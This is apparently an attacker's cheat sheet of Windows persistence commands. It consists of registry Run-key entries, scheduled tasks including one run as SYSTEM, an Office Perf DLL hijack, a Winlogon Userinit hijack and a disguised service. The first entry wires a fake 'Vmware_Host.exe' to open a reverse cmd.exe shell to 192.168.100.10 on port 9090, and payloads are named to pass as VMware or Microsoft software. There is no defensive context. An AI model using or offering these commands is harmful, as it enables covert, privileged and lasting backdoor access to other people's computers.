

### Registry Persistent
```
#Userland AutoRun Persistence:
REG ADD HKEY_CURRENT_USER\SOFTWARE\Microsoft\CurrentVersion\Run /v 1 /d "C:\Users\KarMarKhaing\Vmware_Host.exe -e cmd.exe 192.168.100.10 9090"
reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run

reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d C:\Users\Public\meme.exe

#Elevated AutoRun Persistence:
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d C:\Users\Public\Vmware_Host.exe

reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Vmware /t REG_SZ /d "C:\Users\Public\Vmware_Host.exe" 

reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Vmware /t REG_SZ /d "C:\Users\Public\Vmware_Host.exe"

```
### Scheduling Persistent 
```
#Userland Scheduled Task Persistence:
schtasks /create /tn "Scheduled_Persistence" /tr "cmd.exe /c C:\Users\Public\Vmware_Host.exe" /sc daily /st 18:30

#Elevated Scheduled Task Persistence:
schtasks /create /ru "SYSTEM" /tn "System_Persistence" /tr "cmd.exe /c C:\Users\Public\Vmware_Host.exe" /sc daily /st 18:36
```

### Office Persistent 
```
reg add "HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf" /t REG_SZ /d C:\Users\KarMarKhaing\Service.dll
```
### Winlogon Persistent
```
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"


reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Users\KarMarKhaing\Vmware_Host.exe","C:\Windows\system32\userinit.exe"

```
### Services
```
New-Service -Name "MS_Service for Startups" -BinaryPathName " C:\Users\KarMarKhaing\MS_Startup.exe" -Description "Microsoft Service for Startups"

```

